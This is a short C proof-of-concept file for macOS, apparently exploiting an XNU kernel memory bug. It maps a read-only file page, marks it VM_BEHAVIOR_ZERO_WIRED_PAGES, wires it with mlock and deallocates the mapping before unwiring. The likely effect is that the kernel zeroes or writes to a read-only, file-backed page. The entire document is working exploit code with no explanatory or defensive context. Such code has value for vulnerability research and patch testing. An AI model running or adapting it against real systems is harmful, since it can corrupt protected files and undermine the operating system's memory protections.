#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <mach/mach.h>

void* map_file_page_ro(char* path) {
  int fd = open(path, O_RDONLY);

  if (fd == -1) {
    printf("open failed\n");
    exit(EXIT_FAILURE);
  }

  void* mapped_at = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);

  if (mapped_at == MAP_FAILED) {
    printf("mmap failed\n");
    exit(EXIT_FAILURE);
  }

  return mapped_at;
}

int poc(char *path) {
  kern_return_t kr;

  
  void* page = map_file_page_ro(path);

  printf("mapped file at 0x%016llx\n", (uint64_t)page);

  kr = vm_behavior_set(mach_task_self(),
                            (vm_address_t)page,
                            PAGE_SIZE,
                            VM_BEHAVIOR_ZERO_WIRED_PAGES);

  if (kr != KERN_SUCCESS) {
    printf("failed to set VM_BEHAVIOR_ZERO_WIRED_PAGES on the entry\n");
    exit(EXIT_FAILURE);
  }

  printf("set VM_BEHAVIOR_ZERO_WIRED_PAGES\n");
 
  int mlock_err = mlock(page, PAGE_SIZE);
  if (mlock_err != 0) {
    perror("mlock failed\n");
    exit(EXIT_FAILURE);
  }
  printf("mlock success\n");

  kr = vm_deallocate(mach_task_self(),
                          (vm_address_t)page,
                          PAGE_SIZE);
  if (kr != KERN_SUCCESS) {
    printf("vm_deallocate failed: %s\n", mach_error_string(kr));
    exit(EXIT_FAILURE);
  }
  printf("deleted map entries before unwiring\n");

  return 0;
}
